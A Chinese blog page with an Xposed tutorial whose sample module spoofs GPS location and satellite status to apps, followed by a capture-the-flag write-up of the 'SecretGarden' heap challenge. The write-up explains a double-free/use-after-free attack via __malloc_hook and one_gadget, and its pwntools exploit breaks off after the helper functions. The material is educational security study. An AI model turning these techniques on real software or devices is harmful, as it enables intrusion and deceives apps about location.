<h1 id="Xposed-安装"><a href="#Xposed-安装" class="headerlink" title="Xposed 安装"></a>Xposed 安装</h1><blockquote>
<p>网上有很多中安装方法，在这里我们直接采取最简单的方法安装，直接打开应用市场（如：豌豆荚），搜索xPosed就会看见Xposed框架。</p>
</blockquote>
<h1 id="Xposed开发"><a href="#Xposed开发" class="headerlink" title="Xposed开发"></a>Xposed开发</h1><h2 id="Android-Studio-开发步骤"><a href="#Android-Studio-开发步骤" class="headerlink" title="Android Studio 开发步骤"></a>Android Studio 开发步骤</h2><h3 id="1-新建一个空安卓项目（带有activity也行）"><a href="#1-新建一个空安卓项目（带有activity也行）" class="headerlink" title="1. 新建一个空安卓项目（带有activity也行）"></a>1. 新建一个空安卓项目（带有activity也行）</h3><h3 id="2-在-AndroidManifest-xml中通过-meta-data-申明"><a href="#2-在-AndroidManifest-xml中通过-meta-data-申明" class="headerlink" title="2. 在 AndroidManifest.xml中通过 meta-data 申明:"></a>2. 在 AndroidManifest.xml中通过 meta-data 申明:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    package=&quot;com.example.dafeng.testforxposed&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;application</span><br><span class="line">        android:allowBackup=&quot;true&quot;</span><br><span class="line">        android:icon=&quot;@mipmap/ic_launcher&quot;</span><br><span class="line">        android:label=&quot;@string/app_name&quot;</span><br><span class="line">        android:supportsRtl=&quot;true&quot;</span><br><span class="line">        android:theme=&quot;@style/AppTheme&quot;&gt;</span><br><span class="line">        &lt;activity</span><br><span class="line">            android:name=&quot;.MainActivity&quot;</span><br><span class="line">            android:label=&quot;@string/app_name&quot;</span><br><span class="line">            android:theme=&quot;@style/AppTheme.NoActionBar&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</span><br><span class="line"></span><br><span class="line">                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &lt;!-- 1、标识自己是否为一个Xposed模块 --&gt;</span><br><span class="line">        &lt;meta-data</span><br><span class="line">            android:name=&quot;xposedmodule&quot;</span><br><span class="line">            android:value=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 2、Xposed模块的描述信息 --&gt;</span><br><span class="line">        &lt;meta-data</span><br><span class="line">            android:name=&quot;xposeddescription&quot;</span><br><span class="line">            android:value=&quot;a sample for xposed&quot;/&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- 3、支持Xposed框架的最低版本 --&gt;</span><br><span class="line">        &lt;meta-data</span><br><span class="line">            android:name=&quot;xposedminversion&quot;</span><br><span class="line">            android:value=&quot;82&quot;/&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line"></span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure>

<h3 id="3-在app／build-gradle中添加"><a href="#3-在app／build-gradle中添加" class="headerlink" title="3. 在app／build.gradle中添加"></a>3. 在app／build.gradle中添加</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">provided &apos;de.robv.android.xposed:api:[latest version]&apos;</span><br><span class="line">provided &apos;de.robv.android.xposed:api:[latest version]:sources&apos;</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">dependencies &#123;</span><br><span class="line">compile fileTree(dir: &apos;libs&apos;, include: [&apos;*.jar&apos;])</span><br><span class="line">androidTestCompile(&apos;com.android.support.test.espresso:espresso-core:2.2.2&apos;, &#123;</span><br><span class="line">    exclude group: &apos;com.android.support&apos;, module: &apos;support-annotations&apos;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">provided &apos;de.robv.android.xposed:api:82&apos;</span><br><span class="line">provided &apos;de.robv.android.xposed:api:82:sources&apos;</span><br><span class="line"></span><br><span class="line">compile &apos;com.android.support:appcompat-v7:24.2.1&apos;</span><br><span class="line">compile &apos;com.android.support.constraint:constraint-layout:1.0.0-alpha8&apos;</span><br><span class="line">compile &apos;com.android.support:design:24.2.1&apos;</span><br><span class="line">testCompile &apos;junit:junit:4.12&apos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">1. 请留意，这个82是Xposed Framework API的版本号，叫做xposedminversion。</span><br><span class="line">2. xposedminversion可以在这里进行查询：</span><br><span class="line">https://bintray.com/rovo89/de.robv.android.xposed/api</span><br><span class="line">3. Xposed Framework API文档请参考：http://api.xposed.info/reference/packages.html</span><br></pre></td></tr></table></figure>

<h3 id="4-模块实现"><a href="#4-模块实现" class="headerlink" title="4. 模块实现"></a>4. 模块实现</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package de.robv.android.xposed.mods.tutorial;</span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class Tutorial implements IXposedHookLoadPackage &#123;</span><br><span class="line">public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line">    if (!lpparam.packageName.equals(&quot;com.android.systemui&quot;))</span><br><span class="line">        return;</span><br><span class="line"></span><br><span class="line">    findAndHookMethod(&quot;com.android.systemui.statusbar.policy.Clock&quot;, lpparam.classLoader, &quot;updateClock&quot;, new XC_MethodHook() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">            // this will be called before the clock was updated by the original method</span><br><span class="line">        &#125;</span><br><span class="line">        @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">            // this will be called after the clock was updated by the original method</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>beforeHookedMethod/afterHookedMethod会在被Hook函数之前/之后执行。</p>
</blockquote>
<h3 id="5-添加Hook类的索引"><a href="#5-添加Hook类的索引" class="headerlink" title="5. 添加Hook类的索引"></a>5. 添加Hook类的索引</h3><ol>
<li>在assets目录下创建一个空文件，命名为xposed_init；</li>
<li>在xposed_init中添加Hook类名：com.example.xposedtest.Tutorial</li>
</ol>
<h1 id="代码结构（示例）"><a href="#代码结构（示例）" class="headerlink" title="代码结构（示例）"></a>代码结构（示例）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">package cn.wjdiankong.xposedhook;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line">import android.location.GpsStatus;</span><br><span class="line">import android.location.Location;</span><br><span class="line">import android.location.LocationListener;</span><br><span class="line">import android.location.LocationManager;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.XposedHelpers;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class GPSHooker implements IXposedHookLoadPackage&#123;</span><br><span class="line"></span><br><span class="line">    private final String TAG = &quot;Xposed&quot;;</span><br><span class="line">    private LoadPackageParam mLpp;</span><br><span class="line"></span><br><span class="line">    public void log(String s)&#123;</span><br><span class="line">        Log.d(TAG, s);</span><br><span class="line">        XposedBridge.log(s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //不带参数的方法拦截</span><br><span class="line">    private void hook_method(String className, ClassLoader classLoader, String methodName,</span><br><span class="line">            Object... parameterTypesAndCallback)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            XposedHelpers.findAndHookMethod(className, classLoader, methodName, parameterTypesAndCallback);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //带参数的方法拦截</span><br><span class="line">    private void hook_methods(String className, String methodName, XC_MethodHook xmh)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class&lt;?&gt; clazz = Class.forName(className);</span><br><span class="line">            for (Method method : clazz.getDeclaredMethods())</span><br><span class="line">                if (method.getName().equals(methodName)</span><br><span class="line">                        &amp;&amp; !Modifier.isAbstract(method.getModifiers())</span><br><span class="line">                        &amp;&amp; Modifier.isPublic(method.getModifiers())) &#123;</span><br><span class="line">                    XposedBridge.hookMethod(method, xmh);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            XposedBridge.log(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void handleLoadPackage(LoadPackageParam lpp) throws Throwable &#123;</span><br><span class="line">        mLpp = lpp;</span><br><span class="line"></span><br><span class="line">        hook_method(&quot;android.net.wifi.WifiManager&quot;, mLpp.classLoader, &quot;getScanResults&quot;,</span><br><span class="line">                new XC_MethodHook()&#123;</span><br><span class="line">            /**</span><br><span class="line">             * Android提供了基于网络的定位服务和基于卫星的定位服务两种</span><br><span class="line">             * android.net.wifi.WifiManager的getScanResults方法</span><br><span class="line">             * Return the results of the latest access point scan.</span><br><span class="line">             * @return the list of access points found in the most recent scan.</span><br><span class="line">             */</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param)</span><br><span class="line">                    throws Throwable &#123;</span><br><span class="line">            	//返回空，就强制让apps使用gps定位信息</span><br><span class="line">                param.setResult(null);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        hook_method(&quot;android.telephony.TelephonyManager&quot;, mLpp.classLoader, &quot;getCellLocation&quot;,</span><br><span class="line">                new XC_MethodHook()&#123;</span><br><span class="line">            /**</span><br><span class="line">             * android.telephony.TelephonyManager的getCellLocation方法</span><br><span class="line">             * Returns the current location of the device.</span><br><span class="line">             * Return null if current location is not available.</span><br><span class="line">             */</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param)</span><br><span class="line">                    throws Throwable &#123;</span><br><span class="line">                param.setResult(null);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        hook_method(&quot;android.telephony.TelephonyManager&quot;, mLpp.classLoader, &quot;getNeighboringCellInfo&quot;,</span><br><span class="line">                new XC_MethodHook()&#123;</span><br><span class="line">            /**</span><br><span class="line">             * android.telephony.TelephonyManager类的getNeighboringCellInfo方法</span><br><span class="line">             * Returns the neighboring cell information of the device.</span><br><span class="line">             */</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param)</span><br><span class="line">                    throws Throwable &#123;</span><br><span class="line">                param.setResult(null);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        hook_methods(&quot;android.location.LocationManager&quot;, &quot;requestLocationUpdates&quot;,</span><br><span class="line">                new XC_MethodHook() &#123;</span><br><span class="line">            /**</span><br><span class="line">             * android.location.LocationManager类的requestLocationUpdates方法</span><br><span class="line">             * 其参数有4个：</span><br><span class="line">             * String provider, long minTime, float minDistance,LocationListener listener</span><br><span class="line">             * Register for location updates using the named provider, and a pending intent</span><br><span class="line">             */</span><br><span class="line">            @Override</span><br><span class="line">            protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line"></span><br><span class="line">                if (param.args.length == 4 &amp;&amp; (param.args[0] instanceof String)) &#123;</span><br><span class="line">                    //位置监听器,当位置改变时会触发onLocationChanged方法</span><br><span class="line">                    LocationListener ll = (LocationListener)param.args[3];</span><br><span class="line"></span><br><span class="line">                    Class&lt;?&gt; clazz = LocationListener.class;</span><br><span class="line">                    Method m = null;</span><br><span class="line">                    for (Method method : clazz.getDeclaredMethods()) &#123;</span><br><span class="line">                        if (method.getName().equals(&quot;onLocationChanged&quot;)) &#123;</span><br><span class="line">                            m = method;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    try &#123;</span><br><span class="line">                        if (m != null) &#123;</span><br><span class="line">                            Object[] args = new Object[1];</span><br><span class="line">                            Location l = new Location(LocationManager.GPS_PROVIDER);</span><br><span class="line">                            //台北经纬度:121.53407,25.077796</span><br><span class="line">                            double la=121.53407;</span><br><span class="line">                            double lo=25.077796;</span><br><span class="line">                            l.setLatitude(la);</span><br><span class="line">                            l.setLongitude(lo);</span><br><span class="line">                            args[0] = l;</span><br><span class="line">                            m.invoke(ll, args);</span><br><span class="line">                            XposedBridge.log(&quot;fake location: &quot; + la + &quot;, &quot; + lo);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; catch (Exception e) &#123;</span><br><span class="line">                        XposedBridge.log(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        hook_methods(&quot;android.location.LocationManager&quot;, &quot;getGpsStatus&quot;,</span><br><span class="line">                new XC_MethodHook()&#123;</span><br><span class="line">            /**</span><br><span class="line">             * android.location.LocationManager类的getGpsStatus方法</span><br><span class="line">             * 其参数只有1个：GpsStatus status</span><br><span class="line">             * Retrieves information about the current status of the GPS engine.</span><br><span class="line">             * This should only be called from the &#123;@link GpsStatus.Listener#onGpsStatusChanged&#125;</span><br><span class="line">             * callback to ensure that the data is copied atomically.</span><br><span class="line">             *</span><br><span class="line">             */</span><br><span class="line">            @Override</span><br><span class="line">            protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                GpsStatus gss = (GpsStatus)param.getResult();</span><br><span class="line">                if (gss == null)</span><br><span class="line">                    return;</span><br><span class="line"></span><br><span class="line">                Class&lt;?&gt; clazz = GpsStatus.class;</span><br><span class="line">                Method m = null;</span><br><span class="line">                for (Method method : clazz.getDeclaredMethods()) &#123;</span><br><span class="line">                    if (method.getName().equals(&quot;setStatus&quot;)) &#123;</span><br><span class="line">                        if (method.getParameterTypes().length &gt; 1) &#123;</span><br><span class="line">                            m = method;</span><br><span class="line">                            break;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                m.setAccessible(true);</span><br><span class="line">                //make the apps belive GPS works fine now</span><br><span class="line">                int svCount = 5;</span><br><span class="line">                int[] prns = &#123;1, 2, 3, 4, 5&#125;;</span><br><span class="line">                float[] snrs = &#123;0, 0, 0, 0, 0&#125;;</span><br><span class="line">                float[] elevations = &#123;0, 0, 0, 0, 0&#125;;</span><br><span class="line">                float[] azimuths = &#123;0, 0, 0, 0, 0&#125;;</span><br><span class="line">                int ephemerisMask = 0x1f;</span><br><span class="line">                int almanacMask = 0x1f;</span><br><span class="line">                //5 satellites are fixed</span><br><span class="line">                int usedInFixMask = 0x1f;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (m != null) &#123;</span><br><span class="line">                        m.invoke(gss,svCount, prns, snrs, elevations, azimuths, ephemerisMask, almanacMask, usedInFixMask);</span><br><span class="line">                        param.setResult(gss);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (Exception e) &#123;</span><br><span class="line">                    XposedBridge.log(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/09/29/secretgarden/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/09/29/secretgarden/" class="post-title-link" itemprop="url">SecretGarden</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-09-29 12:00:00" itemprop="dateCreated datePublished" datetime="2018-09-29T12:00:00+08:00">2018-09-29</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/09/29/secretgarden/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/09/29/secretgarden/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="SecretGarden"><a href="#SecretGarden" class="headerlink" title="SecretGarden"></a>SecretGarden</h1><h3 id="程序安全性检查"><a href="#程序安全性检查" class="headerlink" title="程序安全性检查"></a>程序安全性检查</h3><img src="//idongxia.github.io/2018/09/29/secretgarden/checksec.png" style="zoom:50">

<h3 id="程序功能分析"><a href="#程序功能分析" class="headerlink" title="程序功能分析"></a>程序功能分析</h3><p>程序主要功能</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"  1 . Raise a flower "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  2 . Visit the garden "</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  3 . Remove a flower from the garden"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  4 . Clean the garden"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"  5 . Leave the garden"</span>);</span><br></pre></td></tr></table></figure>

<h4 id="Raise-a-flower"><a href="#Raise-a-flower" class="headerlink" title="Raise a flower"></a><code>Raise a flower</code></h4><ol>
<li>该函数会先判断<code>flower</code>的数目,不能超过<code>0x63</code></li>
<li>成功后，申请一个内存块,大小为<code>0x28</code>的结构体，并填0。</li>
<li>分配一个块来读取<code>flower</code>的<code>name</code>，块的大小没有限制。</li>
<li>会将<code>flower</code>的<code>color</code>读到结构体的后<code>0x18</code>位，并设置标志位为1，表示存在。</li>
<li>在<code>garden</code>结构体中找到一个为0的位置记录下<code>flower</code>,并将<code>flower</code>数目加一</li>
</ol>
<img src="//idongxia.github.io/2018/09/29/secretgarden/raise.png" style="zoom:60">

<h4 id="Visit-the-garden"><a href="#Visit-the-garden" class="headerlink" title="Visit the garden"></a><code>Visit the garden</code></h4><p>visit函数会遍历<code>garden</code>结构体，将存在且<code>flag</code>标志位为1的<code>flower</code>输出</p>
<img src="//idongxia.github.io/2018/09/29/secretgarden/visit.png" style="zoom:50">

<h4 id="Remove-a-flower-from-the-garden"><a href="#Remove-a-flower-from-the-garden" class="headerlink" title="Remove a flower from the garden"></a><code>Remove a flower from the garden</code></h4><p>移除一个<code>flower</code>会将name块释放，但是并没有将指针置0，释放之前只检测了是否存在，存在<code>double free</code>漏洞。<br><img src="//idongxia.github.io/2018/09/29/secretgarden/remove2.png" style="zoom:60"></p>
<h4 id="Clean-the-garden"><a href="#Clean-the-garden" class="headerlink" title="Clean the garden"></a><code>Clean the garden</code></h4><p><code>clean</code>函数会将flag函数为0的garden结构体释放</p>
<img src="//idongxia.github.io/2018/09/29/secretgarden/clean.png" style="zoom:70">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这道题的特点是申请的块只能编辑一次，以后只能释放，没有修改函数，而且保护都开启，本质上是使用<code>UAF +DoubleFree</code> </p>
<h4 id="利用-malloc-hook"><a href="#利用-malloc-hook" class="headerlink" title="利用_malloc_hook"></a>利用<code>_malloc_hook</code></h4><p>利用<code>malloc_hook</code>的关键点在于修改了<code>malloc_hook</code>的地址为<code>one_gadget</code>的地址后，触发会不满足条件，需要利用double free来触发<code>malloc hook</code></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(namelength,name,color)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,str(namelength))</span><br><span class="line">	sh.sendafter(<span class="string">':'</span>,name)</span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,color)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_name</span><span class="params">(flower_id)</span>:</span></span><br><span class="line">	sh.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line">	